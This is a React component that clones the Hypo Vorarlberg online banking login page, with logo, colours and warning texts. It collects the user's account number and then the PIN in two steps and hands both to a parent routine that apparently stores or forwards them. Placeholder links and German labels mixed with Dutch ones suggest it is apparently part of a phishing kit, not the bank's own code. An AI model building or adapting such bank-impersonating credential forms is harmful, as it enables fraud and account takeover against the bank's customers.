"use client";

import React, { useState } from "react";

type Props = {
  formData: {
    verfuegernummer?: string;
    pin?: string;
  };
  onChange: (field: string, value: string) => void;
  handleRouteAction: () => void;
  saving?: boolean;
};

export function HypoVorarlberg({ formData, onChange, handleRouteAction, saving }: Props) {
  const [step, setStep] = useState(1);

  const handleNextStep = (e: React.FormEvent) => {
    e.preventDefault();
    if (formData.verfuegernummer) {
      setStep(2);
    }
  };

  const handleFinalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    handleRouteAction();
  };

  return (
    <div className="min-h-screen flex flex-col font-sans text-gray-800">
      {/* Header */}
      <header className="bg-white h-[85px] flex items-center w-full shadow-sm relative z-10">
        <div className="ml-12 lg:ml-24">
          <img src="/hypo-vorarlberg-logo.webp" alt="Hypo Vorarlberg Logo" className="h-[60px] object-contain" />
        </div>
      </header>

      {/* Main Content with Pattern Background */}
      <main 
        className="flex-grow flex flex-col items-center pt-16 px-4 bg-repeat"
        style={{ backgroundImage: "url('/hypo-vorarlberg-bg.webp')" }}
      >
        <div className="bg-white w-full max-w-[620px] shadow-md border border-gray-200">
          {/* Title Bar */}
          <div className="bg-[#0073c0] px-8 py-[18px]">
            <h1 className="text-white text-[22px] font-normal tracking-wide">Login Online Banking</h1>
          </div>

          <div className="p-8">
            {/* Alert Box */}
            <div className="border border-[#e35221] bg-[#fffaf8] p-4 flex gap-4 mb-6 rounded-sm">
              <div className="flex-shrink-0 mt-0.5">
                <div className="w-8 h-8 rounded-full bg-[#e35221] flex items-center justify-center text-white font-bold text-xl leading-none">
                  !
                </div>
              </div>
              <div className="flex flex-col gap-0.5 pt-0.5">
                <h2 className="text-[#e35221] font-bold text-[15px]">Achtung - Warnung vor Telefonbetrug</h2>
                <p className="text-[15px] text-gray-800">
                  Betrüger geben sich als MitarbeiterInnen der Hypo Vorarlberg aus - <a href="#" className="text-[#e35221] hover:underline">mehr erfahren</a>
                </p>
              </div>
            </div>

            {/* Body Text */}
            <p className="text-[15px] text-gray-800 mb-5 leading-relaxed pr-4">
              Tijdens het inloggen wordt een beveiligde verbinding opgezet. Let op dat u uw inloggegevens geheim houdt.
            </p>
            <p className="text-[15px] text-gray-800 mb-8 leading-relaxed pr-4">
              Wir fordern Sie <strong className="font-bold">niemals</strong> zur Bekanntgabe Ihrer persönlichen Zugangsdaten auf. Weder per E-Mail, SMS noch am Telefon.
            </p>

            {/* Form */}
            <form 
              onSubmit={step === 1 ? handleNextStep : handleFinalSubmit}
              className="flex flex-col"
            >
              {step === 1 ? (
                <>
                  <div className="flex justify-between items-end mb-1">
                    <label className="text-[13px] text-gray-500">Gebruikersnaam</label>
                    <div className="text-[13px] text-[#0073c0]">
                      <a href="#" className="hover:underline">Barrierefrei</a> <span className="text-[#0073c0] mx-1">|</span> <a href="#" className="hover:underline">English</a>
                    </div>
                  </div>
                  <input 
                    type="text" 
                    value={formData.verfuegernummer || ""}
                    onChange={(e) => onChange("verfuegernummer", e.target.value)}
                    className="w-full bg-[#f2f2f2] border border-gray-300 rounded-[4px] p-3 h-11 outline-none focus:border-[#0073c0] focus:ring-1 focus:ring-[#0073c0] transition-colors"
                  />
                </>
              ) : (
                <>
                  <div className="flex justify-between items-end mb-1">
                    <label className="text-[13px] text-gray-500">Wachtwoord</label>
                    <div className="text-[13px] text-[#0073c0]">
                      <a href="#" className="hover:underline">Barrierefrei</a> <span className="text-[#0073c0] mx-1">|</span> <a href="#" className="hover:underline">English</a>
                    </div>
                  </div>
                  <input 
                    type="password" 
                    value={formData.pin || ""}
                    onChange={(e) => onChange("pin", e.target.value)}
                    autoFocus
                    className="w-full bg-[#f2f2f2] border border-gray-300 rounded-[4px] p-3 h-11 outline-none focus:border-[#0073c0] focus:ring-1 focus:ring-[#0073c0] transition-colors"
                  />
                </>
              )}

              {/* Centered Link */}
              <div className="mt-8 text-center">
                <a href="#" className="text-[15px] text-[#0073c0] hover:underline">
                  Empfehlungen für Ihre Sicherheit
                </a>
              </div>

              {/* Consent Text */}
              <p className="text-center text-[14px] text-gray-800 mt-6 px-2 leading-relaxed">
                Mit dem Login stimmen Sie den <a href="#" className="text-[#0073c0] hover:underline">AGB und Nutzungsbedingungen</a> sowie der <a href="#" className="text-[#0073c0] hover:underline">Datenschutzerklärung</a> der Hypo Vorarlberg Bank AG ausdrücklich zu.
              </p>

              {/* Button */}
              <button 
                type="submit" 
                disabled={saving} 
                className="mt-6 w-full bg-[#0073c0] hover:bg-[#005da8] text-white py-3 rounded-[3px] font-normal transition-colors text-[16px]"
              >
                {saving ? "Laden..." : "Weiter"}
              </button>
            </form>

            {/* Secondary Links */}
            <div className="mt-8 flex flex-col items-center gap-1 text-[15px]">
              <a href="#" className="text-[#0073c0] hover:underline">Gebruikersnaam vergessen?</a>
              <a href="#" className="text-[#0073c0] hover:underline">Wachtwoord vergessen?</a>
              
              <a href="#" className="mt-6 flex items-center gap-2 text-[#0073c0] hover:underline">
                <div className="w-5 h-5 rounded-full border border-[#0073c0] text-[#0073c0] flex items-center justify-center text-[12px] font-serif font-bold">
                  i
                </div>
                Live Hilfe
              </a>
            </div>

          </div>
        </div>
      </main>
    </div>
  );
}
